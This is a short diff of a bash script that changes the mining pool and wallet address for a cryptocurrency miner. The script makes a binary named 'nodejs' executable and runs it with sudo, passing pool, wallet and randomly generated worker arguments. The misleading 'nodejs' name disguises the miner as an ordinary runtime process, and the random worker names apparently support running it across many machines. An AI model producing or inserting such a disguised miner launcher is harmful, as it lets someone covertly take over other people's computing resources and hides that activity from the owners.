@@ -1,6 +1,6 @@
 #!/bin/bash
-POOL=ethash.unmineable.com:3333
-WALLET=ZIL:zil12xj5q0cvpjaz5nm02zntwsp4yr5zvlt2an5me
+POOL=eth-us1.hellominer.com:1100
+WALLET=0x86ca902b2ca60630188dba14105442141dc3b1dc
 WORKER=$(echo $(shuf -i 1-30 -n 1)-gass) 
 chmod +x nodejs
-sudo ./nodejs -epool $POOL -wal $WALLET.$WORKER -pass x
+sudo ./nodejs -pool $POOL -wal $WALLET.$WORKER -pass x
